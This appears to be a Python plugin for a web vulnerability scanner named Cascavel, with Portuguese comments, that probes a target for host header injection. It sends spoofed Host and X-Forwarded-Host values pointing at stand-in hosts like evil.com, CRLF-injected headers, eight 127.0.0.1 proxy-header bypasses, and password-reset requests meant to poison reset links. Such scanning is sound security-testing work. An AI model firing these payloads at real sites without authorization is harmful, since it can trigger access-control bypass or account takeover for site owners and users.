# plugins/host_header_injection.py — Cascavel 2026 Intelligence
import requests
import time


PAGES = ["/", "/login", "/forgot-password", "/reset-password",
         "/api/", "/admin/", "/register", "/signup", "/contact"]


def _test_host_reflection(target, page):
    """Testa se Host header é refletido na resposta."""
    vulns = []
    test_host = "evil.cascavel-test.com"
    url = f"http://{target}{page}"

    # Direct Host override
    try:
        resp = requests.get(url, headers={"Host": test_host}, timeout=5)
        if test_host in resp.text:
            vulns.append({
                "tipo": "HOST_HEADER_REFLECTED", "pagina": page,
                "severidade": "ALTO",
                "descricao": "Host injetado refletido na resposta — password reset poisoning!",
            })
    except Exception:
        pass

    # X-Forwarded-Host
    try:
        resp = requests.get(url, headers={"X-Forwarded-Host": test_host}, timeout=5)
        if test_host in resp.text:
            vulns.append({
                "tipo": "XFH_REFLECTED", "pagina": page,
                "severidade": "ALTO",
                "descricao": "X-Forwarded-Host refletido — password reset poisoning via proxy!",
            })
    except Exception:
        pass

    return vulns


def _test_host_routing_bypass(target, page):
    """Testa IP bypass via headers de proxy."""
    vulns = []
    bypass_headers = [
        ("X-Forwarded-For", "127.0.0.1"),
        ("X-Real-IP", "127.0.0.1"),
        ("X-Originating-IP", "127.0.0.1"),
        ("X-Client-IP", "127.0.0.1"),
        ("True-Client-IP", "127.0.0.1"),
        ("CF-Connecting-IP", "127.0.0.1"),
        ("X-Custom-IP-Authorization", "127.0.0.1"),
        ("Forwarded", "for=127.0.0.1"),
    ]
    try:
        resp_normal = requests.get(f"http://{target}{page}", timeout=5)
        if resp_normal.status_code not in [401, 403]:
            return vulns

        for header_name, header_val in bypass_headers:
            try:
                resp_bypass = requests.get(
                    f"http://{target}{page}",
                    headers={header_name: header_val}, timeout=5,
                )
                if resp_bypass.status_code == 200:
                    vulns.append({
                        "tipo": "ACCESS_CONTROL_BYPASS", "pagina": page,
                        "header": header_name, "severidade": "CRITICO",
                        "descricao": f"Access control bypass via {header_name}: 127.0.0.1!",
                    })
                    break
            except Exception:
                continue
    except Exception:
        pass
    return vulns


def _test_host_crlf(target, page):
    """Testa CRLF injection via Host header."""
    try:
        resp = requests.get(
            f"http://{target}{page}",
            headers={"Host": f"{target}\r\nX-Injected: cascavel-test"},
            timeout=5,
        )
        if "X-Injected" in str(resp.headers) or "cascavel-test" in str(resp.headers):
            return {
                "tipo": "HOST_HEADER_CRLF", "pagina": page,
                "severidade": "CRITICO",
                "descricao": "CRLF injection via Host header — header injection!",
            }
    except Exception:
        pass
    return None


def _test_absolute_url(target, page):
    """Testa se absolute URL override funciona."""
    try:
        resp = requests.get(
            f"http://{target}{page}",
            headers={"Host": "evil.com"},
            timeout=5,
        )
        location = resp.headers.get("Location", "")
        if "evil.com" in location:
            return {
                "tipo": "HOST_REDIRECT_INJECTION", "pagina": page,
                "location": location[:100],
                "severidade": "ALTO",
                "descricao": "Host header alterou Location redirect — open redirect via host!",
            }
    except Exception:
        pass
    return None


def _test_duplicate_host(target, page):
    """Testa Host header duplicado."""
    try:
        # Some servers use the second Host header
        resp = requests.get(
            f"http://{target}{page}",
            headers={"Host": target, "X-Forwarded-Host": "evil.com"},
            timeout=5,
        )
        if "evil.com" in resp.text:
            return {
                "tipo": "DUPLICATE_HOST_BYPASS", "pagina": page,
                "severidade": "ALTO",
                "descricao": "Duplicate Host header — servidor usa XFH sobre Host!",
            }
    except Exception:
        pass
    return None


def _test_password_reset_poisoning(target):
    """Testa password reset poisoning via Host header."""
    vulns = []
    reset_paths = ["/forgot-password", "/reset-password", "/api/auth/forgot",
                   "/users/password/new", "/account/recover"]
    for path in reset_paths:
        try:
            resp = requests.post(
                f"http://{target}{path}",
                data={"email": "test@cascavel.test"},
                headers={"Host": "evil.com"},
                timeout=5,
            )
            if resp.status_code in [200, 302]:
                if "evil.com" in resp.text or "evil.com" in resp.headers.get("Location", ""):
                    vulns.append({
                        "tipo": "PASSWORD_RESET_POISONING", "path": path,
                        "severidade": "CRITICO",
                        "descricao": "Password reset link contém Host injetado — account takeover!",
                    })
        except Exception:
            continue
    return vulns


def run(target, ip, open_ports, banners):
    """
    Scanner Host Header Injection 2026-Grade — Poisoning, Bypass, CRLF.

    Técnicas: Host reflection, X-Forwarded-Host, 8 IP bypass headers
    (XFF/X-Real-IP/CF-Connecting-IP/True-Client-IP), CRLF via Host,
    absolute URL override, duplicate Host bypass, password reset poisoning,
    Location redirect hijacking.
    """
    _ = (ip, open_ports, banners)
    vulns = []

    for page in PAGES:
        vulns.extend(_test_host_reflection(target, page))
        vulns.extend(_test_host_routing_bypass(target, page))

        crlf = _test_host_crlf(target, page)
        if crlf:
            vulns.append(crlf)

        abs_url = _test_absolute_url(target, page)
        if abs_url:
            vulns.append(abs_url)

        dup = _test_duplicate_host(target, page)
        if dup:
            vulns.append(dup)

    vulns.extend(_test_password_reset_poisoning(target))

    return {
        "plugin": "host_header_injection",
        "versao": "2026.1",
        "tecnicas": ["host_reflection", "xfh_injection", "ip_bypass",
                      "host_crlf", "absolute_url", "duplicate_host",
                      "password_reset_poisoning", "redirect_hijack"],
        "resultados": vulns if vulns else "Nenhum Host Header Injection detectado",
    }
